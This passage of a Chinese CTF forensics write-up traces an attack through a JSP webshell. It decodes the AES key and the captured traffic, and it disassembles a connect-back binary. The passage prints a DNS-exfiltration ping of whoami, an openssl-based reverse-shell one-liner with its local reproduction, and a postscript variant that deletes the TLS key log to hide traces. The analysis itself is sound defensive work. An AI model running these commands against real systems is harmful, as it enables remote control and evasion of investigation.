class="keyword">private</span> java.lang.<span class="function">String <span class="title">P</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SjIHRC7oSVIE"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> java.lang.<span class="function">String <span class="title">K</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"oszXCfTeXHpIkMS3"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> java.lang.<span class="function">String <span class="title">C</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"9d127d5606ee03e479851bf2d4037ba7"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是笔者是个java小孩不会这么办？突然想起木马大多数都是通过一个demo改过来换下密码或key有继续用的。于是将翻译出来的代码，于是那编译出来的片段及hello.jsp代码在github查询。</p>
+<p>正好找到一个分析项目： <a href="https://github.com/webraybtl/webshell1?tab=readme-ov-file" target="_blank" rel="noopener">https://github.com/webraybtl/webshell1?tab=readme-ov-file</a></p>
+<p>里面正好有个分析的jsp 与hello.jsp 高度雷同，同时项目还有个分析文，连接如下：</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzkyNzcxNTczNA==&amp;mid=2247486297&amp;idx=1&amp;sn=8de65caed3d75322d7e2eda8ab4e8c0a&amp;source=41#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzkyNzcxNTczNA==&amp;mid=2247486297&amp;idx=1&amp;sn=8de65caed3d75322d7e2eda8ab4e8c0a&amp;source=41#wechat_redirect</a></p>
+<p>在文章中提到webshell的代码逻辑中，提供了两种传入参数的方式，一种是直接通过参数传递，传递的参数名是“SjIHRC7oSVIE”</p>
+<p>同时在后续的过程中会对上一步传入的恶意代码进行AES解密，解密密钥为固定值“oszXCfTeXHpIkMS3”</p>
+<p><img src="./640" alt="图片"></p>
+<p><img src="./640-20250211232400262" alt="图片"></p>
+<p>在阅读分析文章时发现AES 只有KEY出现，所以怀疑是ECB模式。木马通讯的key就是“oszXCfTeXHpIkMS3”。</p>
+<p>flag:<code>flag{oszXCfTeXHpIkMS3}</code></p>
+<h3 id="黑客连接webshell后第一个执行的命令是什么"><a href="#黑客连接webshell后第一个执行的命令是什么" class="headerlink" title="黑客连接webshell后第一个执行的命令是什么"></a>黑客连接webshell后第一个执行的命令是什么</h3><p>继续前面的分析，我们发现木马在接受“SjIHRC7oSVIE”变量的值后，会对其进行base64解密，之后进行一个ECB模式的AES解密，然后再进行gzip解码。我们按顺序进行破解，就可以看到执行命令时什么。</p>
+<p>我们按照时间进行排序，发现一个第一个执行的命令的包的“SjIHRC7oSVIE”变量的值为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpL+x7y+I+ZMyWEXeJ0NZMa2lXxVJJQX8qje+iiGLCag8tPabyOaifukFtoSxu6RFUpZaKyNuMCXHzK3RDjcTFL73lNoG0uHqJJBjObbdTPDfU7cYGyAY5cXrNzHkdq6IyH1gpeYpyzuLqXSSjhkwp1pKh6Uh6asrqyZuM97bG3Vakj6n1FXkVyDfSWHkDhIns9VKOKE5dgs4ZwhBUxRI67sQmSA2+47jDr&#x2F;nLzxsa1DIv9K67DBh8hrgV2XrBsGbbCsaiZo45Qxy62KbNjXeNpMjnAF&#x2F;05JhkOqFkaqh97yhOgERj&#x2F;cx+y5sYC3GTSBK5UW7o8ozXn3OjZt1b6OFnX13uDI8Pnvajsw1EaY&#x2F;KaDNCUS6ATLbajdQsza7Rmt1MODH7j5EW49s+1dKHdrWGv27YLnRMqQptBCn56yoiLZ21aJ&#x2F;CggSZnRqdee7pChC23JnN+E3t2tKQG8QQnxT6XXsTmii0kRCEoXFiEVrmJpg+7wo1Mqpj9T32i6wlmP+bdJWcOxjizJOoSkd0RAVf8dU399C2TkViAaOhLAj2XCW+qF8z6Dbs&#x2F;G1HIs51QGig0ujdQFkZ+j6wo2F5B0OBh0oMLT4q2A9DuU5XEC00M&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>用CyberChef按照相应顺序进行破解。</p>
+<p><img src="./image-20250211233516331.png" alt="image-20250211233516331"></p>
+<p>然后得到输出值为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Êþº¾   4 &#39;</span><br><span class="line">  </span><br><span class="line">      </span><br><span class="line">   </span><br><span class="line">      &lt;init&gt; ()V Code LineNumberTable &lt;clinit&gt; </span><br><span class="line">StackMapTable  </span><br><span class="line">SourceFile </span><br><span class="line">shell.java  </span><br><span class="line"> ! &quot; # java&#x2F;lang&#x2F;String 	&#x2F;bin&#x2F;bash -c &#x2F;ping -c 1 &#96;whoami&#96;.d5454c8975.ipv6.1433.eu.org. $ % java&#x2F;io&#x2F;IOException &amp; </span><br><span class="line"> shell java&#x2F;lang&#x2F;Object java&#x2F;lang&#x2F;Runtime </span><br><span class="line">getRuntime ()Ljava&#x2F;lang&#x2F;Runtime; exec (([Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;Process; printStackTrace ! </span><br><span class="line">         </span><br><span class="line">          *· ±              </span><br><span class="line">     &#96;     #¸ ½ YSYSYS¶ W§ K*¶ 	±                   	  </span><br><span class="line"> &quot;      ]       </span><br></pre></td></tr></table></figure>
+
+<p>可以从可见字符中看到命令片段，并可以分析为java类。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File type:   Java Class</span><br><span class="line">Extension:   class</span><br><span class="line">MIME type:   application&#x2F;java-vm</span><br></pre></td></tr></table></figure>
+
+<p>将输出值base64后，用反汇编工具逆向：</p>
+<p><img src="./image-20250211234043627.png" alt="image-20250211234043627"></p>
+<p>得到java代码为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shell</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"ping -c 1 `whoami`.d5454c8975.ipv6.1433.eu.org."</span>&#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (java.io.IOException iOException) &#123;</span><br><span class="line">            iOException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此黑客执行的第一个命令”ping -c 1 <code>whoami</code>.d5454c8975.ipv6.1433.eu.org.”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#96;flag&#123;ping -c 1 &#96;whoami&#96;.d5454c8975.ipv6.1433.eu.org.&#125;&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="这个webshell是怎么进行回显的"><a href="#这个webshell是怎么进行回显的" class="headerlink" title="这个webshell是怎么进行回显的"></a>这个webshell是怎么进行回显的</h3><p>我们继续分析黑客执行的第一个命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 &#96;whoami&#96;.d5454c8975.ipv6.1433.eu.org.</span><br></pre></td></tr></table></figure>
+
+<p>发现ping了’<code>whoami</code>.d5454c8975.ipv6.1433.eu.org.’ 这个域名，推测黑客通过查询dnslog来着确认回显。</p>
+<p>因此答案为’<code>whoami</code>.d5454c8975.ipv6.1433.eu.org.’的上级域名 <code>d5454c8975.ipv6.1433.eu.org.</code></p>
+<p>即flag为<code>flag{d5454c8975.ipv6.1433.eu.org.}</code></p>
+<h3 id="黑客留下后面的反连接IP和PORT是什么"><a href="#黑客留下后面的反连接IP和PORT是什么" class="headerlink" title="黑客留下后面的反连接IP和PORT是什么"></a>黑客留下后面的反连接IP和PORT是什么</h3><p>我们分析最后一个访问hello.jsp流量，将流量进行解密。</p>
+<p><img src="./image-20250211184257211.png" alt="image-20250211184257211"></p>
+<p>反汇编后发现一个疑似经典反弹shell执行操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shell</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"echo bWtmaWZvIC90bXAvcmV2c2hlbGw7IC9iaW4vYmFzaCAtaSA8IC90bXAvcmV2c2hlbGwgMj4mMSB8IG9wZW5zc2wgc19jbGllbnQgLXF1aWV0IC1jb25uZWN0IDE5Mi4xNjguMzEuMTkwOjIwMjQgLWtleWxvZ2ZpbGUga2V5LmxvZyA+IC90bXAvcmV2c2hlbGw7IHJtIC1mIC90bXAvcmV2c2hlbGw=|base64 -d|bash"</span>&#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (java.io.IOException iOException) &#123;</span><br><span class="line">            iOException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将<code>echo</code> 到<code>|base64 -d</code>间的<code>bWtmaWZvIC90bXAvcmV2c2hlbGw7IC9iaW4vYmFzaCAtaSA8IC90bXAvcmV2c2hlbGwgMj4mMSB8IG9wZW5zc2wgc19jbGllbnQgLXF1aWV0IC1jb25uZWN0IDE5Mi4xNjguMzEuMTkwOjIwMjQgLWtleWxvZ2ZpbGUga2V5LmxvZyA+IC90bXAvcmV2c2hlbGw7IHJtIC1mIC90bXAvcmV2c2hlbGw=</code>进行base64解密得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo &#x2F;tmp&#x2F;revshell; &#x2F;bin&#x2F;bash -i &lt; &#x2F;tmp&#x2F;revshell 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.31.190:2024 -keylogfile key.log &gt; &#x2F;tmp&#x2F;revshell; rm -f &#x2F;tmp&#x2F;revshell</span><br></pre></td></tr></table></figure>
+
+<p>从而得到ip为192.168.31.190 端口为2024 。</p>
+<p>因此flag为<code>flag{192.168.31.190|2024}</code></p>
+<h3 id="黑客通过后门反连接执行对第一条命令是什么"><a href="#黑客通过后门反连接执行对第一条命令是什么" class="headerlink" title="黑客通过后门反连接执行对第一条命令是什么"></a>黑客通过后门反连接执行对第一条命令是什么</h3><p>之前通过解密得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo &#x2F;tmp&#x2F;revshell; &#x2F;bin&#x2F;bash -i &lt; &#x2F;tmp&#x2F;revshell 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.31.190:2024 -keylogfile key.log &gt; &#x2F;tmp&#x2F;revshell; rm -f &#x2F;tmp&#x2F;revshell</span><br></pre></td></tr></table></figure>
+
+<p>在本地复现下，控制端执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 12345</span><br></pre></td></tr></table></figure>
+
+<p>被控制端执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo &#x2F;tmp&#x2F;revshell; &#x2F;bin&#x2F;bash -i &lt; &#x2F;tmp&#x2F;revshell 2&gt;&amp;1 | openssl s_client -quiet -connect 127.0.0.1:12345 -keylogfile key.log &gt; &#x2F;tmp&#x2F;revshell; rm -f &#x2F;tmp&#x2F;revshell</span><br></pre></td></tr></table></figure>
+
+<p>发现就/tmp/revshell会正常消失，但是key.log会保留在执行命令对应的目录下。key.log会存放ssl链接时的密钥情况。</p>
+<p>因此，通过find命令来查询key.log文件位置。从而读取key.log信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(root:&#x2F;) $ find . -name key*.log</span><br><span class="line">.&#x2F;opt&#x2F;apache-tomcat-8.5.19&#x2F;bin&#x2F;key.log</span><br><span class="line">(root:&#x2F;) $ cat &#x2F;opt&#x2F;apache-tomcat-8.5.19&#x2F;bin&#x2F;key.log</span><br><span class="line"># SSL&#x2F;TLS secrets log file, generated by OpenSSL</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET ff6ead1c7421ca1588e6e18e3504a8f263bd33573deede0313087e6fd70eb675 9f1537ef9693595f34d342f700efaf6ffe33e4b3d1cc5c4cadc776297617f3cdf3ed73d88cf1dfaf97c0b0e98609d1ea</span><br><span class="line">EXPORTER_SECRET ff6ead1c7421ca1588e6e18e3504a8f263bd33573deede0313087e6fd70eb675 1d72faed3451768edc39b7f8839ef7a0d30fdfba3c8da68b3d04ddbc4c73f48907ba6d871cadf04934bf51d3a0bc85e6</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 ff6ead1c7421ca1588e6e18e3504a8f263bd33573deede0313087e6fd70eb675 00ee6ab397c81475e0ed409ed9cffea7f3dbed67f1a6b2b24a40f71445a31dc02a0d69e0ba252a3dc9aa5a741261e2b2</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET ff6ead1c7421ca1588e6e18e3504a8f263bd33573deede0313087e6fd70eb675 c766297fbe7376d29fed6a8220b9125ccd67e218e8e308ac2226400375f6618ab4312760272b3498d933f2571cb34f5d</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 ff6ead1c7421ca1588e6e18e3504a8f263bd33573deede0313087e6fd70eb675 d02aec7819a8a207687e7a40b47f2cc44d939fc0ef7ad2b00adcec173c2abd4ac96e87cf429c39272c26cf51a3ce34c6</span><br></pre></td></tr></table></figure>
+
+<p>我们按照如下步骤来利用Wireshark 读取反弹shell时的流量： </p>
+<p>1.通过 <strong>Wireshark</strong> -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; (Pre)-Master-Secret log file，告诉 Wireshark 去哪里寻找 Key 文件</p>
+<p><img src="./image-20250210205104781.png" alt="image-20250210205104781"></p>
+<p>2.导入后重新打开 pcap，<code>ip.dst == 192.168.31.190 and tcp.dstport==2024</code> 匹配目的为192.168.31.190 端口为2024的流量。再选择follow 对应流量流，即可看到解密后的 TLS 流量数据</p>
+<p><img src="./image-20250210205212566.png" alt="image-20250210205212566"></p>
+<p>可以看到在反弹shell后第一个执行命令为ls </p>
+<p><img src="./image-20250210205633276.png" alt="image-20250210205633276"></p>
+<p>因此flag为<code>flag{ls}</code></p>
+<h4 id="后记1"><a href="#后记1" class="headerlink" title="后记1"></a>后记1</h4><p>这个反弹操作在支持ssh 服务端口的设备一般够可以使用，只要再修改下命令移除key.log就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo &#x2F;tmp&#x2F;revshell; &#x2F;bin&#x2F;bash -i &lt; &#x2F;tmp&#x2F;revshell 2&gt;&amp;1 | openssl s_client -quiet -connect 127.0.0.1:12345 -keylogfile key.log &gt; &#x2F;tmp&#x2F;revshell; rm -f &#x2F;tmp&#x2F;revshell； rm -f key.log；</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="请上机排查黑客新增对后门程序会链接到哪台恶意主机"><a href="#请上机排查黑客新增对后门程序会链接到哪台恶意主机" class="headerlink" title="请上机排查黑客新增对后门程序会链接到哪台恶意主机"></a>请上机排查黑客新增对后门程序会链接到哪台恶意主机</h3><p>有点怪，我在题目远程环境里没有看到后门程序进程及可疑程序。但是在题目附近中发现两个可疑程序文件 lock和update，把他们放入微步沙箱，其中update 有远程连接行为 ip 10.10.13.37 。本以为答案结果提交发现错误，结合提示发现还要端口，就只有逆向分析这个update程序 orz… （ lock看了下是对文件的加密，感觉像后面的题）。</p>
+<p>把文件拖入ida发现是一堆syscall 系统调用手搓的程序。主要系统调用部分如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400140                 xor     edi, edi        ; addr</span><br><span class="line">LOAD:0000000000400142                 push    9</span><br><span class="line">LOAD:0000000000400144                 pop     rax</span><br><span class="line">LOAD:0000000000400145                 cdq</span><br><span class="line">LOAD:0000000000400146                 mov     dh, 10h</span><br><span class="line">LOAD:0000000000400148                 mov     rsi, rdx        ; len</span><br><span class="line">LOAD:000000000040014B                 xor     r9, r9          ; off</span><br><span class="line">LOAD:000000000040014E                 push    22h ; &#39;&quot;&#39;</span><br><span class="line">LOAD:0000000000400150                 pop     r10             ; flags</span><br><span class="line">LOAD:0000000000400152                 push    7</span><br><span class="line">LOAD:0000000000400154                 pop     rdx             ; prot</span><br><span class="line">LOAD:0000000000400155                 syscall                 ; LINUX - sys_mmap</span><br><span class="line">LOAD:0000000000400157                 test    rax, rax</span><br><span class="line">LOAD:000000000040015A                 js      short loc_4001AD</span><br><span class="line">LOAD:000000000040015C                 push    0Ah</span><br><span class="line">LOAD:000000000040015E                 pop     r9</span><br><span class="line">LOAD:0000000000400160                 push    rax</span><br><span class="line">LOAD:0000000000400161                 push    29h ; &#39;)&#39;</span><br><span class="line">LOAD:0000000000400163                 pop     rax</span><br><span class="line">LOAD:0000000000400164                 cdq                     ; protocol</span><br><span class="line">LOAD:0000000000400165                 push    2</span><br><span class="line">LOAD:0000000000400167                 pop     rdi             ; family</span><br><span class="line">LOAD:0000000000400168                 push    1</span><br><span class="line">LOAD:000000000040016A                 pop     rsi             ; type</span><br><span class="line">LOAD:000000000040016B                 syscall                 ; LINUX - sys_socket</span><br><span class="line">LOAD:000000000040016D                 test    rax, rax</span><br><span class="line">LOAD:0000000000400170                 js      short loc_4001AD</span><br><span class="line">LOAD:0000000000400172                 xchg    rax, rdi        ; fd</span><br><span class="line">LOAD:0000000000400174</span><br><span class="line">LOAD:0000000000400174 loc_400174:                             ; CODE XREF: start+133↓j</span><br><span class="line">LOAD:0000000000400174                 mov     rcx, 250D0A0A5C110002h</span><br><span class="line">LOAD:000000000040017E                 push    rcx</span><br><span class="line">LOAD:000000000040017F                 mov     rsi, rsp        ; uservaddr</span><br><span class="line">LOAD:0000000000400182                 push    10h</span><br><span class="line">LOAD:0000000000400184                 pop     rdx             ; addrlen</span><br><span class="line">LOAD:0000000000400185                 push    2Ah ; &#39;*&#39;</span><br><span class="line">LOAD:0000000000400187                 pop     rax</span><br><span class="line">LOAD:0000000000400188                 syscall                 ; LINUX - sys_connect</span><br><span class="line">LOAD:000000000040018A                 pop     rcx</span><br><span class="line">LOAD:000000000040018B                 test    rax, rax</span><br><span class="line">LOAD:000000000040018E                 jns     short loc_4001B5</span><br><span class="line">LOAD:0000000000400190                 dec     r9</span><br><span class="line">LOAD:0000000000400193                 jz      short loc_4001AD</span><br><span class="line">LOAD:0000000000400195                 push    rdi</span><br><span class="line">LOAD:0000000000400196                 push    23h ; &#39;#&#39;</span><br><span class="line">LOAD:0000000000400198                 pop     rax</span><br><span class="line">LOAD:0000000000400199                 push    0</span><br><span class="line">LOAD:000000000040019B                 push    5</span><br><span class="line">LOAD:000000000040019D                 mov     rdi, rsp        ; rqtp</span><br><span class="line">LOAD:00000000004001A0                 xor     rsi, rsi        ; rmtp</span><br><span class="line">LOAD:00000000004001A3                 syscall                 ; LINUX - sys_nanosleep</span><br><span class="line">LOAD:00000000004001A5                 pop     rcx</span><br><span class="line">LOAD:00000000004001A6                 pop     rcx</span><br><span class="line">LOAD:00000000004001A7                 pop     rdi</span><br><span class="line">LOAD:00000000004001A8                 test    rax, rax</span><br><span class="line">LOAD:00000000004001AB                 jns     short loc_400174</span><br><span class="line">LOAD:00000000004001AD</span><br><span class="line">LOAD:00000000004001AD loc_4001AD:                             ; CODE XREF: start+E2↑j</span><br><span class="line">LOAD:00000000004001AD                                         ; start+F8↑j ...</span><br><span class="line">LOAD:00000000004001AD                 push    3Ch ; &#39;&lt;&#39;</span><br><span class="line">LOAD:00000000004001AF                 pop     rax</span><br><span class="line">LOAD:00000000004001B0                 push    1</span><br><span class="line">LOAD:00000000004001B2                 pop     rdi             ; error_code</span><br><span class="line">LOAD:00000000004001B3                 syscall                 ; LINUX - sys_exit</span><br><span class="line">LOAD:00000000004001B5</span><br><span class="line">LOAD:00000000004001B5 loc_4001B5:                             ; CODE XREF: start+116↑j</span><br><span class="line">LOAD:00000000004001B5                 pop     rsi</span><br><span class="line">LOAD:00000000004001B6                 push    7Eh ; &#39;~&#39;</span><br><span class="line">LOAD:00000000004001B8                 pop     rdx</span><br><span class="line">LOAD:00000000004001B9                 syscall                 ; LINUX - sys_exit</span><br></pre></td></tr></table></figure>
+
+<p>分析发现是一个客户端调用，通过调用sys_connect系统调用来连接服务端。通过查询资料发现sys_connect系统调用的传参数为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys_connect(int fd, struct sockaddr __user *uservaddr, int </span><br><span class="line">addrlen)</span><br></pre></td></tr></table></figure>
+
+<p>fd  为socket 的 fd</p>
+<p>uservaddr 为   <code>struct sockaddr __user</code>结构的地址</p>
+<p>addrlen 为地址长度。</p>
+<p>uservaddr值为<code>250D0A0A5C110002 h</code> ，但是直接分析也看不出与 10.10.13.37 的关系，更不要说端口了。</p>
+<p>但还有update 的环境简单可以动态调试，gdb在SYS_connect调用时，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x400188    syscall  &lt;SYS_connect&gt;</span><br><span class="line">       fd: 0x3 (socket:[3266521])</span><br><span class="line">       addr: 0x7fffffffde50 ◂— 0x250d0a0a5c110002</span><br><span class="line">       len: 0x10</span><br><span class="line">  0x40018a    pop</span><br></pre></td></tr></table></figure>
+
+<p>发现参数值与我们静态分析时，推理的内容基本差不多。但是addr还是看不出什么。于是继续动态调试到syscall执行后。</p>
+<p>我们用<code>netstat -natp</code> 来查看端口情况，发现一条目的为10.10.13.37：4444  准备连接到记录。</p>
+<p><img src="./image-20250210222605864.png" alt="image-20250210222605864"></p>
+<p>因此我们得到flag：</p>
+<p>Flag:<code>{10.10.13.37|4444}</code></p>
+<h4 id="后记2"><a href="#后记2" class="headerlink" title="后记2"></a>后记2</h4><p>后面通过查询资料发现<code>struct sockaddr_in</code>结构体是一个 8 字节的 IPv4 套接字地址结构，该结构的内存布局为：</p>
+<ul>
+<li><strong>2 字节</strong>：地址族（<code>sin_family</code>）</li>
+<li><strong>2 字节</strong>：端口号（<code>sin_port</code>，以网络字节序存储）</li>
+<li><strong>4 字节</strong>：IP 地址（<code>sin_addr.s_addr</code>，以网络字节序存储）</li>
+</ul>
+<p>同时在我们网络中数据是按照大端排序结构来进行存储的。因此用大端的思路分析<code>250D0A0A5C110002</code>:</p>
+<p><code>250D0A0A</code>: 0x25 值为 37  ，0xd 值为13 ， 0xa 值为10  ，分析下来刚好是10.10.13.37</p>
+<p><code>5C11</code>: 按照大端换算的值应该是0x115c ，分析下来刚好是 4444</p>
+<p><code>0002</code>: 还是为0x0002含义是地址族为 <code>AF_INET</code>（IPv4）</p>
+<h3 id="黑客加密一个-root目录下一个重要文件，请叫解密后的文件内容作为flag提交"><a href="#黑客加密一个-root目录下一个重要文件，请叫解密后的文件内容作为flag提交" class="headerlink" title="黑客加密一个/root目录下一个重要文件，请叫解密后的文件内容作为flag提交"></a>黑客加密一个/root目录下一个重要文件，请叫解密后的文件内容作为flag提交</h3><p>将/root目录下的flagen.txt下载打开</p>
+<p><img src="./image-20250211171704865.png" alt="image-20250211171704865"></p>
+<p>发现文件16位为可见字符，后面被加密后以非可见为主。</p>
+<p>分析加密程序lock（之前说过的附件的程序） ，分析主要main函数部分反汇编代码发现是一个CBC模式下的AES加密。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 